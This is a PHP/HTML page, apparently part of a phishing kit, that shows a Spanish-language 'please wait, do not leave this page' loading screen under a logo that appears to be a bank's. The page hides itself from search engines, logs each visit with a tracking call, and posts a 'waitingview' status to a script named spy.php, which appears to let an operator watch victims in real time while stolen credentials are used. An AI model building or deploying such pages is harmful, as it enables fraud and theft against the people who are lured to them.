<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8">
<meta name="robots" content="nofollow, noindex">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="inc/bs.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700,800" />
<link rel="stylesheet" href="inc/style.css">
<script src="inc/jq.js"></script>
</head>
<body>
<header class="headrow">

<div class="col-logo">
<img src="inc/logo_bk.svg" class="logo">
</div>
<div class="col-menu">
<i class="fa fa-bars"></i>
</div>
</header>
<div class="container"> 
<div class="title">Espere por favor...</div>
<div class="form text-center bg-white">
    <p style="font-size:0.7em;">No abandones esta página. lo redirigiremos automáticamente una vez que se complete el procesamiento.</p>
<img src="inc/loading.gif" style="width:40px;">
</div>
</div>

 
<?php 
$j->ctr("LOADING (".@$_GET['p'].")");
?>
 <script>
 $.post("spy.php", {waitingview:1});
</script>

</body>
</html>